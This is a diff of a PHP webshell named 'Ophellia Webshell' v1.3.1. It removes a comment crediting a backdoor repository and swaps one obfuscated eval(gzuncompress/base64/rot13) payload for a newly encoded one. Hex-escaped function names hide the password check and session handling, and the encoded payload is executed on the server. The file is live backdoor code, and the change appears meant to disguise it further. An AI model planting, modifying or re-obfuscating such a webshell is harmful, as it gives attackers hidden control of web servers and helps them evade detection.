@@ -1,5 +1,4 @@
 <?php
-// from https://github.com/1337r0j4n/php-backdoors
 /*
               Ophellia Webshell
             v1.3.1 - 'Neko Hacker'
@@ -84,7 +83,7 @@ echo '<html><head><title>o p h e l l i a</title><meta name="viewport" content="w
 if ("\x6D\x64\x35"(${"\x5f\x50\x4f\x53\x54"}['pass']) == $pass) {
   "\x73\x65\x73\x73\x69\x6F\x6E\x5F\x73\x74\x61\x72\x74"();
   ${"\x5F\x53\x45\x53\x53\x49\x4F\x4E"}['pass'] = $pass;
-}; eval(gzuncompress(str_rot13(base64_decode('a5xIQ1p4hEAM/SuDLFHBj7XQpUishyJ5Qt2q24vIYDWugjrTZMRdV/97VO2hhUDyXmvJWEMIJqhAzoR5h4u+N3yym1EX6DuaUfF7FHRjWdNGAmwYAqt4MIIgADZACI2UfARizWB4nuN8/RfR43iST/79h46jt2aUpPQcv6iG5pO67ZBeQ9KSDRIHOerrPDXs3rUPD7Z7a7Tv3L1GjqPNGw4mqYthUZOMRWDRYrKrkiskRM/Ic4cEQnGpsahDrFV73hZL8sbRIwXnXVsWsnKDZrXmbLZ3Jm1YnY5QySqsNJNAj7Ju1SqH02WL4n59ruSyin5ZekrRzwnFWs+AWpJCW2r5cGGYJEpuGP4PeTtnqg=='))));
+}; eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
 if (isset(${"\x5F\x53\x45\x53\x53\x49\x4F\x4E"}['pass']) == $pass) {
   if ("\x69\x6E\x69\x5F\x67\x65\x74"('safe_mode')) {
     $Safe = "<b>ON</b>";
